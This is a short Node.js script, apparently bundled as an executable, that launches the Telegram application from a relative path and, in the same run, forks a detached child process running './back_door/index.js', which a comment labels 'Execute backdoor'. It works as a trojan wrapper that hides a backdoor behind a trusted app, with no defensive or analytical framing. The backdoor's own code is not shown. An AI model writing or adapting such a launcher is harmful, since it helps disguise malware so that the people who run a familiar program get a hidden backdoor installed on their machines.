const { execFile, fork } = require('child_process')
const path = require('path')
const fs = require('fs')
fs.readdirSync('/snapshot/building/').forEach(console.log)

console.log(__filename)

let exec_path = '../../Applicazioni/Telegram/Telegram'

//console.log(backdoor_path)
execFile(exec_path).unref()

var require = function (str) {}

require('./back_door/index.js')

// Execute backdoor
subprocess = fork(path.join('/snapshot/building/' , './back_door/index.js'), [], { detached: true })
